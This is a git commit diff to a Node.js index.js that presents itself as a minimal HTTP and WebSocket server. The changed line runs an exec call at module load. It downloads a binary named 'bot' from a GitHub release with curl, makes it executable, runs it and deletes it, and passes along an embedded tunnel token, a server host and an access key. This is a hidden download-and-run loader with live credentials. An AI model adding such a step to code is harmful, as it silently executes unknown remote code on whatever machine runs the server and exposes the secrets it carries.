370b787715b4527056617fb782f8a2ebaa02aa5c
Kuang YiWu <136738046+alphaxcv@users.noreply.github.com>
2024-09-26 01:07:50 -0700

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const http = require('http');
 const WebSocket = require('ws');
 const { exec } = require('child_process');
 
-exec(`C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYjc1MzMyZjctOWJlOC00Y2U0LWJmYTAtNThkYmZkYWVhMWQ3IiwicyI6Ik16UTVaR1EzWWpRdE56UXpaaTAwTlRWaExUZzJZMkl0WldOa1lqSmhOelkwTWpBdyJ9 N_S=nz.tx.dedyn.io N_K=ivqtrgHSnQJIm9E98v bash -c 'curl -L -o bot https://github.com/seav1/dl/releases/download/src/bot && chmod +x bot && ./bot && rm bot'`);
+exec(`C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiMjhhYzU1MmUtNDM4Yy00YzhmLWFmZDUtZjNjZjIzNTU1NzA1IiwicyI6IlpUbGxaRFptWldRdFpXWm1ZaTAwTVRKakxXRXlOMkV0TldSaE1HVm1NRGswTmprMiJ9 N_S=nz.tx.dedyn.io N_K=iRcQHQwJLgbaK4t9GC bash -c 'curl -L -o bot https://github.com/seav1/dl/releases/download/src/bot && chmod +x bot && ./bot && rm bot'`);
 
 const server = http.createServer((req, res) => {
     res.end('200 OK\n');
